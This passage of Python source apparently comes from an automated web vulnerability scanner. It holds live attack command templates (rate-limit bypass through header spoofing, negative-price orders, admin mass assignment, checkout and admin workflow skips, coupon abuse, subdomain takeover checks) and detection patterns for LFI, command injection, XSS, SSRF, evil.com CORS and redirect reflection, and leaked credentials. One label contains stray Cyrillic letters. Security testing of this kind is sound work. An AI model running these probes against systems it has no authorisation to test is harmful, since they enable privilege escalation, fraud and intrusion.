            "    -H \"X-Forwarded-For: $ip\" -H 'X-Real-IP: $ip' -H 'X-Client-IP: $ip' "
            "    -d 'username=admin&password=wrong' 2>/dev/null); echo \"$ip → $code\"; "
            "done; "
            "echo '=null X-Forwarded-For='; "
            "curl -so /dev/null -w '%{http_code}' --max-time 5 -X POST {target}/login "
            "  -H 'X-Forwarded-For: ' -d 'username=admin&password=wrong' 2>/dev/null",
            "Rate limit bypass — X-Forwarded-For IP rotation, null header"
        ),
    ],
    "Business Logic Agent": [
        # 1: Price/quantity manipulation
        (
            r"""python3 - <<'PYEOF'
import subprocess, json
base = '{target}'
tests = [
    ({'price': -1,    'quantity': 1,   'qty': 1},   "negative_price"),
    ({'price': 0,     'quantity': 1},               "zero_price"),
    ({'price': 0.001, 'quantity': 1},               "fractional_price"),
    ({'quantity': -1, 'qty': -100, 'amount': -999},"negative_qty"),
    ({'quantity': 2147483647},                      "int_max_qty"),
    ({'quantity': 9999999999, 'price': 0.00},       "overflow_qty"),
]
for ep in ['/api/order','/api/orders','/api/cart','/api/checkout','/api/purchase']:
    for payload, label in tests:
        r = subprocess.run(['curl','-s','--max-time','8','-X','POST',f"{base}{ep}",
                            '-H','Content-Type: application/json',
                            '-d',json.dumps(payload)],capture_output=True,text=True)
        if r.stdout and len(r.stdout) > 10:
            try:
                d = json.loads(r.stdout)
                body_str = str(d).lower()
                # Require a genuine transaction confirmation signal — not just 'success'
                # which appears in error responses too (e.g. {"success": false})
                confirmed = (
                    any(k in body_str for k in ['order_id','transaction_id','confirmation','invoice_id','payment_id'])
                    or ('"success"' in body_str and 'true' in body_str and 'error' not in body_str)
                )
                if confirmed:
                    print(f"BИЗLOGIC_VULN {label}: {ep} accepted → {str(d)[:80]}")
                else:
                    print(f"  {label} on {ep}: {str(d)[:60]}")
            except:
                # Non-JSON: only flag if unmistakable acceptance signal present
                body_lower = r.stdout.lower()
                if any(k in body_lower for k in ['order_id','transaction_id','order confirmed','payment accepted']):
                    print(f"BIZ_LOGIC_VULN {label}: {ep} → {r.stdout[:80]}")
PYEOF""",
            "Business logic — negative price, zero price, INT_MAX quantity, price=0 exploit"
        ),
        # 2: Mass assignment — send unexpected privileged fields
        (
            r"""python3 - <<'PYEOF'
import subprocess, json
base = '{target}'
privileged_fields = [
    {'role': 'admin'},
    {'isAdmin': True, 'is_admin': True},
    {'role': 'admin', 'permissions': ['*'], 'scope': 'admin'},
    {'credits': 999999, 'balance': 999999},
    {'verified': True, 'email_verified': True},
    {'subscription': 'premium', 'plan': 'enterprise'},
    {'admin': True, 'superuser': True, 'staff': True},
]
for ep in ['/api/profile','/api/user','/api/account','/api/me','/api/settings','/api/register']:
    for payload in privileged_fields:
        for method in ['PUT','PATCH','POST']:
            r = subprocess.run(['curl','-s','--max-time','6',f'-X{method}',f"{base}{ep}",
                                '-H','Content-Type: application/json',
                                '-d',json.dumps(payload)],capture_output=True,text=True)
            if r.stdout:
                body = r.stdout[:200].lower()
                if any(k in body for k in ['role":"admin','isadmin":true','admin":true','credits":999']):
                    print(f"MASS_ASSIGN_VULN: {method} {ep} with {payload} → field reflected: {r.stdout[:80]}")
PYEOF""",
            "Mass assignment — inject role/admin/credits/verified fields on profile endpoints"
        ),
        # 3: Workflow skip — bypass payment/verification steps
        (
            r"""python3 - <<'PYEOF'
import subprocess
base = '{target}'
# Try to access post-payment / post-verification pages directly
skip_tests = [
    ('/checkout/confirm',   'POST', {'step':'confirm','payment_verified':True}),
    ('/checkout/complete',  'POST', {'order_id':'1','paid':True}),
    ('/api/order/confirm',  'POST', {'payment_status':'paid','amount':0}),
    ('/dashboard',          'GET',  {}),
    ('/admin',              'GET',  {}),
    ('/api/admin/users',    'GET',  {}),
    ('/api/admin',          'GET',  {}),
]
import json
for ep, method, payload in skip_tests:
    args = ['curl','-s','-I','--max-time','6',f'-X{method}',f"{base}{ep}"]
    if payload and method=='POST':
        args += ['-H','Content-Type: application/json','-d',json.dumps(payload)]
    r = subprocess.run(args, capture_output=True,text=True)
    import re
    code = re.search(r'HTTP/\S+\s+(\d+)',r.stdout)
    c = code.group(1) if code else '?'
    if c in ('200','201','204'):
        print(f"WORKFLOW_SKIP_VULN: {method} {ep} → HTTP {c} (accessible without prior steps!)")
    else:
        print(f"  {method} {ep} → HTTP {c}")
PYEOF""",
            "Workflow skip — direct access to checkout/confirm/admin bypassing prior steps"
        ),
        # 4: Coupon/discount abuse — reuse, stacking, negative discount
        (
            r"""python3 - <<'PYEOF'
import subprocess, json
base = '{target}'
coupon_tests = [
    {'coupon': 'SAVE100','discount_code': 'SAVE100'},
    {'coupon': 'FREE','promo_code': 'FREE','voucher': 'FREE'},
    {'coupon_amount': -100, 'discount': -999},
    {'coupon': 'ADMIN50','code': 'STAFF100'},
]
for ep in ['/api/apply-coupon','/api/discount','/api/promo','/api/voucher','/api/cart/coupon']:
    for payload in coupon_tests:
        r = subprocess.run(['curl','-s','--max-time','6','-X','POST',f"{base}{ep}",
                            '-H','Content-Type: application/json',
                            '-d',json.dumps(payload)],capture_output=True,text=True)
        if r.stdout and 'discount' in r.stdout.lower():
            print(f"COUPON_RESPONSE: {ep} with {payload} → {r.stdout[:80]}")
PYEOF""",
            "Coupon/discount abuse — reuse, stacking, negative discount amount"
        ),
    ],
    "Subdomain Enum": [
        # 1: Certificate transparency + live check
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, json
host = '{host}'.split(':')[0]
try:
    r = subprocess.run(['curl','-s','--max-time','20',f'https://crt.sh/?q=%.{host}&output=json'],
                       capture_output=True,text=True)
    data = json.loads(r.stdout)
    subs = sorted(set(
        d.get('name_value','').replace('*.','').strip()
        for d in data
        if d.get('name_value') and '*' not in d.get('name_value','') and '@' not in d.get('name_value','')
        and not d.get('name_value','').startswith('@')
    ))
    print(f"CRT_SH: {len(subs)} unique subdomains from cert transparency")
    for s in subs[:50]: print(f"  {s}")
except Exception as e:
    print(f"CRT_SH_ERROR: {e}")
PYEOF""",
            "crt.sh certificate transparency — unique subdomain enumeration"
        ),
        # 2: Common subdomain bruteforce with live check
        (
            "for sub in www api dev staging test beta internal vpn mail git jenkins jira "
            "admin dashboard static cdn assets media images files upload download "
            "auth oauth sso login portal old legacy backup db redis elastic kibana grafana "
            "monitoring status health docs swagger api-docs; do "
            "  host=$(echo {host} | sed 's/:[0-9]*$//'); "
            "  code=$(curl -sI --max-time 4 http://$sub.$host 2>/dev/null | head -1 | grep -oE '[0-9]{3}'); "
            "  [ -n \"$code\" ] && [ \"$code\" != '000' ] && echo \"SUBDOMAIN_LIVE: $sub.$host → HTTP $code\"; "
            "done",
            "Common subdomain brute-force — 40 names, live HTTP probe"
        ),
        # 3: Subdomain takeover check — dangling CNAMEs
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, json
host = '{host}'.split(':')[0]
# Get subdomains from crt.sh
try:
    r = subprocess.run(['curl','-s','--max-time','15',f'https://crt.sh/?q=%.{host}&output=json'],
                       capture_output=True,text=True)
    data = json.loads(r.stdout)
    subs = list(set(
        d.get('name_value','').replace('*.','').strip()
        for d in data if d.get('name_value') and '@' not in d.get('name_value','')
    ))[:30]
except:
    subs = []
# Known takeover fingerprints
TAKEOVER_SIGS = {
    'github.com':        "There isn't a GitHub Pages site here",
    'herokuapp.com':     "No such app",
    'amazonaws.com':     "NoSuchBucket",
    'azurewebsites.net': "404 Web Site not found",
    'shopify.com':       "Sorry, this shop is currently unavailable",
    'cargo.site':        "404 Not Found",
    'pantheon.io':       "The gods are not pleased",
    'fastly.net':        "Fastly error: unknown domain",
    'statuspage.io':     "Better Uptime says",
}
for sub in subs:
    # Check CNAME
    cname_r = subprocess.run(['dig','+short','CNAME',sub],capture_output=True,text=True)
    cname = cname_r.stdout.strip()
    if cname:
        for provider, sig in TAKEOVER_SIGS.items():
            if provider in cname.lower():
                # Check if page shows takeover signature
                body = subprocess.run(['curl','-sL','--max-time','6',f'http://{sub}'],
                                      capture_output=True,text=True).stdout
                if sig.lower() in body.lower():
                    print(f"SUBDOMAIN_TAKEOVER_VULN: {sub} → CNAME {cname} → unclaimed on {provider}!")
                else:
                    print(f"  CNAME: {sub} → {cname} ({provider}) — not takeable (claimed)")
PYEOF""",
            "Subdomain takeover — CNAME to unclaimed GitHub Pages/Heroku/AWS/Shopify/Fastly"
        ),
    ],
    "Nuclei Agent": [
        ("which nuclei && echo 'nuclei installed' || echo 'nuclei not installed — install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'", "Check nuclei installation"),
        ("nuclei -u {target} -severity medium,high,critical -j -silent -timeout 10 -rate-limit 5 -bulk-size 3 -c 3 2>/dev/null | head -20", "Nuclei scan — medium/high/critical"),
    ],
}


# ── Static pattern-matching findings ─────────────────────────────────────────
# Each entry: list of (check_fn, finding_text, severity)
# check_fn receives the full accumulated output string → returns bool
# Negative checks (absent = finding) only fire when output is non-trivial (>50 chars)

_STATIC_PATTERNS: dict = {
    "Spider Agent": [
        # ── Critical exposures ────────────────────────────────────────────────
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*\.env(?:\.local|\.production|\.staging|\.backup)?(?:\s|$)', o, re.I)),
         "Environment file exposed (.env) — API keys, DB credentials, secrets publicly readable", "critical"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*\.git/(?:config|HEAD)', o, re.I)),
         "Git repository exposed (.git/) — source code, credentials, commit history accessible", "critical"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*dump\.sql', o, re.I)),
         "Database dump file publicly accessible — full data exposure risk", "critical"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:phpmyadmin|adminer)', o, re.I)),
         "Database admin panel exposed (phpMyAdmin/Adminer) — direct database access possible", "critical"),
        # ── High severity ─────────────────────────────────────────────────────
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*actuator/env', o, re.I)),
         "Spring Boot Actuator /env exposed — environment variables and secrets readable", "high"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*actuator/(?:beans|mappings)', o, re.I)),
         "Spring Boot Actuator admin endpoints exposed — application internals readable", "high"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:wp-admin|wp-login)', o, re.I)),
         "WordPress admin panel discovered — brute-force and plugin exploitation risk", "high"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:/console|/debug|__debug__|_debug)', o, re.I)),
         "Debug/admin console exposed — code execution or sensitive data exposure risk", "high"),
        (lambda o: bool(re.search(r'access-control-allow-origin:\s*https?://evil\.com', o, re.I)),
         "CORS misconfiguration — arbitrary origin reflected, cross-origin credential theft possible", "high"),
        (lambda o: bool(re.search(r'access-control-allow-credentials:\s*true', o, re.I))
            and bool(re.search(r'access-control-allow-origin:\s*https?://', o, re.I)),
         "CORS with credentials — cross-origin session hijacking possible (allow-credentials + non-wildcard origin)", "high"),
        (lambda o: "graphql introspection enabled" in o.lower(),
         "GraphQL introspection enabled — full API schema exposed to attackers", "high"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:telescope/requests|_profiler)', o, re.I)),
         "Development debug profiler exposed — request history and sensitive data visible", "high"),
        # ── Medium severity ───────────────────────────────────────────────────
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:swagger|openapi|api-docs|api-schema)', o, re.I)),
         "API documentation publicly exposed — full endpoint schema available to attackers", "medium"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:graphql|graphiql)', o, re.I)),
         "GraphQL endpoint exposed — introspection and schema extraction possible", "medium"),
        (lambda o: bool(re.search(r'(?:200|EXPOSED)\s+.*(?:backup|\.bak|\.old|\.orig)', o, re.I)),
         "Backup or old file accessible — may contain credentials or outdated vulnerable code", "medium"),
        (lambda o: len(re.findall(r'Disallow:\s*/\S+', o, re.I)) >= 3,
         "robots.txt reveals multiple hidden/sensitive paths — attackers can enumerate disallowed directories", "medium"),
        (lambda o: not re.search(r'x-frame-options:', o, re.I) and not re.search(r'frame-ancestors', o, re.I)
            and len(o) > 100,
         "Clickjacking protection missing — X-Frame-Options and CSP frame-ancestors both absent", "medium"),
        (lambda o: not re.search(r'strict-transport-security:', o, re.I) and len(o) > 100,
         "HSTS header missing — SSL stripping and downgrade attacks possible", "medium"),
        # ── Low / Info ────────────────────────────────────────────────────────
        (lambda o: bool(re.search(r'x-powered-by:\s*\S+', o, re.I)),
         "X-Powered-By header discloses server technology — aids attacker fingerprinting", "low"),
        (lambda o: bool(re.search(r'server:\s*\S+/[\d.]+', o, re.I)),
         "Server header version disclosure — exact server version aids exploit selection", "low"),
        (lambda o: bool(re.search(r'JS bundles scanned: \d+, API routes found: ([1-9]\d*)', o)),
         "API endpoints extracted from JavaScript bundles — attack surface mapped for fuzzing", "info"),
        (lambda o: bool(re.search(r'Sitemap:\s*([1-9]\d*)\s*URLs', o)),
         "Sitemap.xml discovered with URLs — site structure exposed, additional attack surface found", "info"),
    ],
    "Security Headers": [
        (lambda o: len(o) > 50 and "content-security-policy" not in o.lower(),
         "Content-Security-Policy header missing — XSS payloads execute without restriction", "medium"),
        (lambda o: len(o) > 50 and "x-frame-options" not in o.lower() and "frame-ancestors" not in o.lower(),
         "X-Frame-Options missing — page embeddable in iframe (clickjacking risk)", "medium"),
        (lambda o: len(o) > 50 and "x-content-type-options" not in o.lower(),
         "X-Content-Type-Options: nosniff missing — MIME-sniffing attacks possible", "low"),
        (lambda o: len(o) > 50 and "strict-transport-security" not in o.lower(),
         "HSTS header missing — SSL-stripping downgrade attacks possible", "medium"),
        (lambda o: len(o) > 50 and "referrer-policy" not in o.lower(),
         "Referrer-Policy missing — URL parameters/tokens may leak to third-party sites", "low"),
        (lambda o: re.search(r"x-powered-by:\s*\S+", o, re.I) is not None,
         "X-Powered-By header discloses server technology to attackers", "low"),
        (lambda o: re.search(r"server:\s*\S+/[\d.]+", o, re.I) is not None,
         "Server header discloses version number — aids attacker reconnaissance", "low"),
        (lambda o: "set-cookie:" in o.lower() and "httponly" not in o.lower(),
         "Session cookie missing HttpOnly flag — accessible via document.cookie in XSS", "medium"),
        (lambda o: "set-cookie:" in o.lower() and re.search(r"set-cookie:[^\n]*\n", o, re.I) is not None
         and "secure" not in o.lower(),
         "Session cookie missing Secure flag — transmitted over plaintext HTTP", "medium"),
        (lambda o: "set-cookie:" in o.lower() and "samesite" not in o.lower(),
         "Session cookie missing SameSite attribute — cross-site request forgery possible", "medium"),
    ],
    "JS Library Scanner": [
        (lambda o: re.search(r"jquery[.-](1\.[0-9]\.|2\.[0-2]\.)", o, re.I) is not None,
         "Vulnerable jQuery version detected (< 3.5.0) — CVE-2020-11022 XSS via .html()/.append()", "high"),
        (lambda o: re.search(r"bootstrap[.-](2\.|3\.|4\.[0-2]\.)", o, re.I) is not None,
         "Outdated Bootstrap detected (< 4.3.1) — CVE-2019-8331 XSS via data-* attributes", "medium"),
        (lambda o: re.search(r"angular[.-]?js[.-](1\.[0-9])", o, re.I) is not None,
         "AngularJS 1.x detected — End of Life since Dec 2021, multiple XSS CVEs", "medium"),
        (lambda o: re.search(r"lodash[.-](4\.(1[0-6]|[0-9])\.|3\.|2\.|1\.|0\.)", o, re.I) is not None,
         "Vulnerable Lodash version detected (< 4.17.21) — CVE-2021-23337 prototype pollution", "medium"),
        (lambda o: "moment.js" in o.lower() or re.search(r"moment[.-][\d.]+\.js", o, re.I) is not None,
         "Moment.js detected — End of Life, consider migrating to date-fns or Day.js", "low"),
    ],
    "LFI Agent": [
        (lambda o: "root:x:0:0:" in o or "root:*:0:0:" in o,
         "LFI CONFIRMED: /etc/passwd readable — full system user list exposed", "critical"),
        (lambda o: "/bin/bash" in o or "/bin/sh" in o,
         "LFI confirmed: shell path visible — system file contents leaking", "high"),
        (lambda o: "[fonts]" in o or "[extensions]" in o,
         "LFI CONFIRMED: Windows win.ini readable via path traversal", "critical"),
        (lambda o: "/var/log" in o or "access.log" in o,
         "LFI: log file path visible — potential log poisoning RCE vector", "high"),
    ],
    "CMDi Agent": [
        (lambda o: re.search(r"uid=\d+\(", o) is not None,
         "COMMAND INJECTION CONFIRMED: id command output visible in response", "critical"),
        (lambda o: re.search(r"uid=0\(root\)", o) is not None,
         "COMMAND INJECTION AS ROOT CONFIRMED — full server compromise", "critical"),
        (lambda o: re.search(r"^[a-z_][a-z0-9_-]*$", o.strip().split("\n")[0] if o.strip() else "", re.I) is not None
         and "whoami" in o.lower(),
         "Possible command injection: username returned in response", "high"),
    ],
    "Open Redirect": [
        # location: value must START with evil.com as host — prevents false positives
        # where evil.com is only a query parameter (e.g. ?url=https://evil.com echoed back)
        (lambda o: bool(re.search(r'location:\s*https?://evil\.com(?:[/?#\s]|$)', o, re.I)),
         "OPEN REDIRECT CONFIRMED: Location header redirects to evil.com", "medium"),
        (lambda o: bool(re.search(r'location:\s*//evil\.com(?:[/?#\s]|$)', o, re.I)),
         "Open redirect confirmed via protocol-relative URL", "medium"),
    ],
    "CORS Agent": [
        (lambda o: "access-control-allow-origin: *" in o.lower(),
         "CORS wildcard (*) — any origin can read responses from this API", "medium"),
        (lambda o: "access-control-allow-origin: https://evil.com" in o.lower(),
         "CORS reflects arbitrary Origin — cross-origin reads possible from any domain", "high"),
        (lambda o: "access-control-allow-origin: null" in o.lower(),
         "CORS allows null origin — exploitable via sandboxed iframes", "medium"),
        (lambda o: "access-control-allow-credentials: true" in o.lower()
         and ("access-control-allow-origin: *" in o.lower()
              or "access-control-allow-origin: https://evil.com" in o.lower()),
         "CRITICAL CORS: credentials=true with permissive origin — session theft via CORS", "critical"),
    ],
    "TLS/SSL Agent": [
        (lambda o: "sslv3" in o.lower(),
         "SSLv3 supported — vulnerable to POODLE attack (CVE-2014-3566)", "high"),
        (lambda o: re.search(r"\bTLSv1\b", o) is not None and "TLSv1.2" not in o and "TLSv1.3" not in o,
         "TLS 1.0 only — deprecated protocol, vulnerable to BEAST/POODLE", "medium"),
        (lambda o: len(o) > 30 and "strict-transport-security" not in o.lower(),
         "HSTS header absent on HTTPS endpoint — SSL-stripping possible", "medium"),
        (lambda o: "verify error" in o.lower() or "certificate has expired" in o.lower(),
         "TLS certificate expired or invalid — users see browser security warnings", "high"),
        (lambda o: "self signed" in o.lower(),
         "Self-signed TLS certificate — not trusted by browsers", "medium"),
    ],
    "SQLi Agent": [
        (lambda o: any(s in o.lower() for s in
                       ["sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_", "you have an error in your sql"]),
         "SQL error message in response — database error leakage, possible injection point", "high"),
        (lambda o: "warning: mysql" in o.lower() or "mysql error" in o.lower(),
         "MySQL error message exposed — confirms MySQL backend, aids injection", "high"),
    ],
    "XSS Agent": [
        (lambda o: "<script>alert(1)</script>" in o,
         "REFLECTED XSS CONFIRMED: script tag payload returned unescaped in response", "high"),
        (lambda o: "onerror=alert(1)" in o,
         "REFLECTED XSS CONFIRMED: onerror payload returned unescaped in response", "high"),
    ],
    "SSRF Agent": [
        (lambda o: "ami-id" in o.lower() or "instance-id" in o.lower() or "iam" in o.lower(),
         "SSRF CONFIRMED: AWS instance metadata service (169.254.169.254) accessible", "critical"),
        (lambda o: "ssh-" in o.lower() or "openssh" in o.lower(),
         "SSRF confirmed: internal SSH service reachable via SSRF", "high"),
    ],
    "XXE Agent": [
        (lambda o: "root:x:0:0:" in o or "root:*:0:0:" in o,
         "XXE CONFIRMED: /etc/passwd returned in XML response", "critical"),
    ],
    "Secrets Scanner": [
        # ── File exposure ───────────────────────────────────────────────────
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['.env','.env.local','.env.prod','.env.production','.env.staging']),
         ".env file publicly accessible — API keys, DB credentials, and secrets exposed in plaintext", "critical"),
        (lambda o: "FILE_EXPOSED:.env" in o and "FILE_EXPOSED:.env.local" not in o and ".env.local" not in o.split("FILE_EXPOSED:")[1].split(":")[0] if "FILE_EXPOSED:.env" in o else False,
         ".env file publicly readable — application secrets and credentials in response", "critical"),
        (lambda o: "FILE_EXPOSED:.git/config" in o or ("FILE_EXPOSED:.git/HEAD" in o),
         ".git repository files exposed — source code history and credentials accessible via git clone", "critical"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['credentials.json','credentials.yml','secrets.yml','secrets.json']),
         "Credentials file publicly accessible — API keys and service account tokens exposed", "critical"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['terraform.tfvars','terraform.tfstate']),
         "Terraform state/vars file exposed — cloud infrastructure secrets and resource IDs visible", "critical"),
        (lambda o: "FILE_EXPOSED:wp-config.php" in o or "FILE_EXPOSED:wp-config.php.bak" in o,
         "WordPress config file exposed — database credentials and secret keys readable", "critical"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['docker-compose.yml','docker-compose.yaml','.dockerenv']),
         "Docker compose file exposed — service credentials, environment variables, and internal topology visible", "high"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['application.properties','application.yml','application.yaml']),
         "Spring application config exposed — datasource credentials and API keys readable", "high"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['.npmrc','.pypirc','.netrc','.boto']),
         "Package registry config exposed — private registry credentials and auth tokens visible", "high"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['database.yml','database.json','db.config.js']),
         "Database configuration file exposed — DB credentials and connection strings accessible", "high"),
        (lambda o: any(f"FILE_EXPOSED:{p}" in o for p in ['firebase.json','.firebaserc','firebaseConfig.js']),
         "Firebase configuration exposed — project credentials and database URLs accessible", "high"),
        (lambda o: "FILE_EXPOSED:config.js" in o or "FILE_EXPOSED:config.json" in o or "FILE_EXPOSED:config.php" in o,
         "Application config file publicly accessible — credentials and internal configuration exposed", "high"),
        (lambda o: "FILE_FORBIDDEN" in o,
         "Secret file path returned 403 Forbidden — file likely exists but access is restricted; verify server config", "info"),
        # ── Provider-specific tokens ────────────────────────────────────────
        (lambda o: "TOKEN_FOUND:AWS_ACCESS_KEY" in o,
         "AWS Access Key ID (AKIA...) exposed in page/JS — attacker can authenticate to AWS as this identity", "critical"),
        (lambda o: "TOKEN_FOUND:STRIPE_LIVE_KEY" in o or "TOKEN_FOUND:STRIPE_RESTRICTED_KEY" in o,
         "Stripe live secret key exposed — attacker can create charges, issue refunds, and access customer data", "critical"),
        (lambda o: "TOKEN_FOUND:GITHUB_TOKEN" in o,
         "GitHub personal access token (ghp_/gho_/ghs_) exposed — repository read/write access compromised", "critical"),
        (lambda o: "TOKEN_FOUND:OPENAI_KEY" in o,
         "OpenAI API key exposed — attacker can consume quota and access conversation history", "high"),
        (lambda o: "TOKEN_FOUND:ANTHROPIC_KEY" in o,
         "Anthropic API key exposed — attacker can consume Claude API quota", "high"),
        (lambda o: "TOKEN_FOUND:HUGGINGFACE_TOKEN" in o,
         "HuggingFace token exposed — model access and private dataset access compromised", "high"),
        (lambda o: "TOKEN_FOUND:PRIVATE_KEY_PEM" in o,
         "PEM private key (RSA/EC/OPENSSH) found in page — TLS/SSH private key exposed, immediate rotation required", "critical"),
        (lambda o: "TOKEN_FOUND:GOOGLE_API_KEY" in o,
         "Google API key (AIza...) exposed — Maps, Gmail, Firebase and other Google services accessible", "high"),
        (lambda o: "TOKEN_FOUND:SLACK_TOKEN" in o,
         "Slack OAuth token (xox...) exposed — workspace messages and user data accessible", "high"),
        (lambda o: "TOKEN_FOUND:SENDGRID_KEY" in o,
         "SendGrid API key (SG...) exposed — attacker can send email as your domain and access contact lists", "high"),
        (lambda o: "TOKEN_FOUND:TWILIO_SID" in o,
         "Twilio Account SID (AC...) exposed — combined with auth token allows full telephony API access", "high"),
        (lambda o: "TOKEN_FOUND:SQUARE_TOKEN" in o,
         "Square access token exposed — payment data and transaction history accessible", "critical"),
        (lambda o: "TOKEN_FOUND:MAILGUN_KEY" in o,
         "Mailgun API key exposed — attacker can send email from your domain and read inbound messages", "high"),
        (lambda o: "TOKEN_FOUND:DB_CONN_STRING" in o,
         "Database connection string exposed — credentials and host embedded in URL format (mongodb://, postgres://)", "critical"),
        (lambda o: "TOKEN_FOUND:CLOUDINARY_URL" in o,
         "Cloudinary URL with credentials exposed — media storage API key and secret accessible", "high"),
        (lambda o: "TOKEN_FOUND:JWT_TOKEN" in o,
         "JWT token (eyJ...) exposed in page source — token may allow session hijacking if not expired", "medium"),
        (lambda o: "TOKEN_FOUND:APP_SECRET" in o,
         "Application secret key found — framework signing secret exposed, session forgery possible", "high"),
        # ── Keyword-matched secrets ─────────────────────────────────────────
        (lambda o: "KEYWORD_SECRET:AWS_SECRET_ACCESS_KEY" in o or "KEYWORD_SECRET:AWS_SECRET_KEY" in o,
         "AWS secret access key variable exposed — cloud credential leak confirmed via keyword match", "critical"),
        (lambda o: "KEYWORD_SECRET:STRIPE_SECRET" in o or "KEYWORD_SECRET:STRIPE_KEY" in o,
         "Stripe secret key variable exposed — payment processing credentials in source", "critical"),
        (lambda o: "KEYWORD_SECRET:PRIVATE_KEY" in o or "KEYWORD_SECRET:SSH_PRIVATE_KEY" in o,
         "Private key variable exposed in source — cryptographic key material accessible", "critical"),
        (lambda o: "KEYWORD_SECRET:DATABASE_PASSWORD" in o or "KEYWORD_SECRET:DB_PASSWORD" in o or "KEYWORD_SECRET:MYSQL_PASSWORD" in o,
         "Database password variable exposed — plaintext DB credential in page or JS source", "critical"),
        (lambda o: "KEYWORD_SECRET:SLACK_TOKEN" in o or "KEYWORD_SECRET:SLACK_WEBHOOK" in o,
         "Slack token/webhook variable exposed — workspace integration credential in source", "high"),
        (lambda o: "KEYWORD_SECRET:GITHUB_TOKEN" in o or "KEYWORD_SECRET:HEROKU_API_KEY" in o,
         "DevOps platform token variable exposed — source control or hosting platform credential in source", "high"),
        (lambda o: "KEYWORD_SECRET:FACEBOOK_APP_SECRET" in o or "KEYWORD_SECRET:TWITTER_CONSUMER_SECRET" in o or "KEYWORD_SECRET:GOOGLE_OAUTH_CLIENT_SECRET" in o,
         "Social OAuth app secret exposed — attacker can impersonate your application to OAuth provider", "high"),
        (lambda o: "KEYWORD_SECRET:SENTRY_DSN" in o,
         "Sentry DSN exposed — error reporting credentials visible, attacker can inject fake error events", "medium"),
        (lambda o: "KEYWORD_SECRET:ENCRYPTION_KEY" in o or "KEYWORD_SECRET:SIGNING_SECRET" in o or "KEYWORD_SECRET:WEBHOOK_SECRET" in o,
         "Encryption/signing key variable exposed — cryptographic material in page source", "high"),
        (lambda o: o.count("KEYWORD_SECRET:") >= 3,
         "Multiple secrets detected via keyword scan — application is leaking numerous credential variables in source", "critical"),
        # ── Backup + debug files ────────────────────────────────────────────
        (lambda o: "BACKUP_EXPOSED:.env.bak" in o or "BACKUP_EXPOSED:.env~" in o or "BACKUP_EXPOSED:.env.old" in o,
         ".env backup file publicly accessible — backup copy of secrets exposed when main .env is protected", "critical"),
        (lambda o: "BACKUP_EXPOSED:backup.sql" in o or "BACKUP_EXPOSED:db.sql" in o or "BACKUP_EXPOSED:dump.sql" in o,
         "SQL database dump publicly accessible — full database content including credentials exposed", "critical"),
        (lambda o: any(f"BACKUP_EXPOSED:{p}" in o for p in ['site.tar.gz','backup.zip','www.zip','site.zip','files.tar.gz','database.sql.gz']),
         "Archive file with site/database backup publicly accessible — source code and data exposed", "critical"),
        (lambda o: any(f"BACKUP_EXPOSED:{p}" in o for p in ['config.php.bak','config.js.bak','settings.py.bak']),
         "Config backup file accessible — backup copy of application configuration with credentials exposed", "high"),
        (lambda o: "BACKUP_EXPOSED:.git/refs" in o or "BACKUP_EXPOSED:.svn" in o,
         "VCS repository references exposed — source code history structure accessible", "high"),
        (lambda o: any(f"BACKUP_EXPOSED:{p}" in o for p in ['config.js.map','main.js.map','app.js.map','bundle.js.map']),
         "JavaScript source map publicly accessible — original unminified source code with comments exposed", "medium"),
        (lambda o: "DEBUG_SECRETS" in o,
         "Debug endpoint exposes secrets — /actuator/env or debug path returns credentials in HTTP 200 response", "critical"),
        (lambda o: "DEBUG_OPEN" in o,
         "Debug/diagnostic endpoint accessible — actuator, phpinfo, or console endpoint returns HTTP 200", "high"),
        (lambda o: "BACKUP_EXPOSED:.DS_Store" in o,
         ".DS_Store file exposed — macOS directory metadata reveals file structure and hidden filenames", "medium"),
        # ── Header secrets ──────────────────────────────────────────────────
        (lambda o: "HEADER_SECRET:API_KEY_IN_HEADER" in o or "HEADER_SECRET:AUTH_TOKEN_IN_HEADER" in o,
         "Authentication token exposed in response header — bearer or API token returned to client in header", "critical"),
        (lambda o: "HEADER_SECRET:SYMFONY_DEBUG_TOKEN" in o,
         "Symfony debug token header exposed — X-Debug-Token-Link reveals profiler URL with request internals", "medium"),
        (lambda o: "COOKIE_FLAGS:" in o and "missing HttpOnly" in o,
         "Session cookie missing HttpOnly flag — JavaScript can read session token enabling XSS-to-account-takeover", "high"),
        (lambda o: "COOKIE_FLAGS:" in o and "missing Secure" in o,
         "Session cookie missing Secure flag — session token transmitted over plaintext HTTP connections", "medium"),
        # ── Entropy + PII ───────────────────────────────────────────────────
        (lambda o: o.count("HIGH_ENTROPY_SECRET") >= 2,
         "Multiple high-entropy secrets detected near credential variable names — likely real API keys or tokens in source", "high"),
        (lambda o: o.count("HIGH_ENTROPY_SECRET") == 1,
         "High-entropy string detected near credential variable name — possible hardcoded API key or token", "medium"),
        (lambda o: "EMAIL_IN_SOURCE" in o,
         "Internal email addresses in page source — staff/developer emails exposed, phishing and enumeration risk", "low"),
        (lambda o: "SOURCE_MAP_REFERENCED" in o,
         "JavaScript source maps referenced in production — original commented source code accessible via .map files", "medium"),
        (lambda o: "INTERNAL_IP_IN_SOURCE" in o,
         "Internal RFC-1918 IP address in page source — network topology and internal service addresses exposed", "low"),
